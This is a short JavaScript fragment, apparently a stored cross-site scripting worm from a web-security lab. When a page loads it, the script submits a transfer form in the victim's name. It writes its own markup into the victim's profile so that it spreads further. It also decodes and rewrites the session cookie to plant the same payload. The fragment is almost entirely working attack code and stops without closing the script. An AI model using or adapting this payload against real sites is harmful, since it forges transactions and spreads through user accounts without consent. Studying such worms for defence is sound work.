    <script>
        const wormtext = document.getElementById("worm").outerHTML;
        const transform = document.getElementById("transfer-form");
        transform.action = `http://${document.location.hostname}:3000/post_transfer`;
        transform.submit();
        const updinput = document.getElementById("update-input");
        updinput.value = wormtext;
        const updform = document.getElementById("update-form");
        updform.action = `http://${document.location.hostname}:3000/set_profile`;
        updform.submit();
        const session = document.cookie.split(";").find(v => v.trim().startsWith("session")).split("=")[1].trim();
        const user = JSON.parse(atob(session));
        user.account.profile = wormtext;
        document.cookie = document.cookie.replace(session, btoa(JSON.stringify(user)));
